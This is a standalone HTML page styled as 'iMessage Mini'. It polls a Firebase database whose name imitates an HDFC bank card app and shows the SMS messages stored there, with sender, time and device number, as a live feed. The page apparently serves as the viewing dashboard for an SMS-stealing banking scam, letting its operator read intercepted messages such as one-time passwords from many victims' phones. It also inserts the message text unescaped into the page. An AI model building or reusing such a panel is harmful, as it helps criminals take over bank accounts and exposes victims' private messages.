<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iMessage Mini</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;500;600&display=swap');
        
        body { 
            background-color: #ffffff; 
            font-family: 'SF Pro Text', -apple-system, sans-serif;
            color: #1d1d1f;
            -webkit-font-smoothing: antialiased;
        }

        .ios-header {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(20px);
            border-bottom: 0.5px solid #d1d1d6;
        }

        .message-row {
            border-bottom: 0.5px solid #e5e5ea;
            transition: background 0.2s;
        }

        .message-row:active { background-color: #f2f2f7; }

        /* Chota aur barik text settings */
        .text-tiny { font-size: 11px; line-height: 1.4; }
        .text-meta { font-size: 9px; font-weight: 500; color: #8e8e93; }
        .sender-name { font-size: 12px; font-weight: 600; color: #000; }

        .dot { width: 6px; height: 6px; border-radius: 50%; display: inline-block; }
    </style>
</head>
<body class="pb-10">

    <header class="sticky top-0 z-50 ios-header px-4 py-3">
        <div class="max-w-xl mx-auto flex justify-between items-center">
            <h1 class="text-lg font-semibold tracking-tight">Messages</h1>
            <div class="flex items-center gap-2">
                <span id="update-time" class="text-[10px] text-gray-400 font-medium italic">Syncing...</span>
                <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
            </div>
        </div>
    </header>

    <main id="feed" class="max-w-xl mx-auto">
        <div class="py-10 text-center text-xs text-gray-300">Searching database...</div>
    </main>

    <script>
        const URL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
        const rainbow = ['#FF3B30', '#007AFF', '#34C759', '#AF52DE', '#FF9500', '#5856D6'];

        async function fetchMini() {
            try {
                const response = await fetch(URL);
                const data = await response.json();
                if (!data) return;

                let allSms = [];

                function scan(obj, dev = "???") {
                    for (let key in obj) {
                        if (obj[key] && typeof obj[key] === 'object') {
                            if (obj[key].message && obj[key].received_time) {
                                allSms.push({ ...obj[key], dev: dev, pKey: key });
                            } else {
                                let nextDev = obj[key].deviceNumber || dev;
                                scan(obj[key], nextDev);
                            }
                        }
                    }
                }
                scan(data);

                // SORT: Newest on Top
                allSms.sort((a, b) => b.pKey.localeCompare(a.pKey));

                render(allSms);
                document.getElementById('update-time').innerText = "Live: " + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});

            } catch (err) { console.log(err); }
        }

        function render(items) {
            const container = document.getElementById('feed');
            
            container.innerHTML = items.map((item, index) => {
                const color = rainbow[index % rainbow.length];
                
                return `
                    <div class="message-row px-4 py-3 flex gap-3 items-start">
                        <div class="mt-1">
                            <span class="dot" style="background-color: ${color}"></span>
                        </div>
                        
                        <div class="flex-1 min-w-0">
                            <div class="flex justify-between items-center mb-0.5">
                                <span class="sender-name truncate">${item.sender}</span>
                                <span class="text-meta uppercase font-mono">${item.received_time}</span>
                            </div>
                            <p class="text-tiny text-gray-600 font-normal">
                                ${item.message}
                            </p>
                            <div class="mt-1 text-meta flex gap-2">
                                <span>#${item.dev}</span>
                                <span class="opacity-30">|</span>
                                <span>ID: ${item.pKey.substring(1,9)}</span>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        setInterval(fetchMini, 2000);
        fetchMini();
    </script>
</body>
</html>
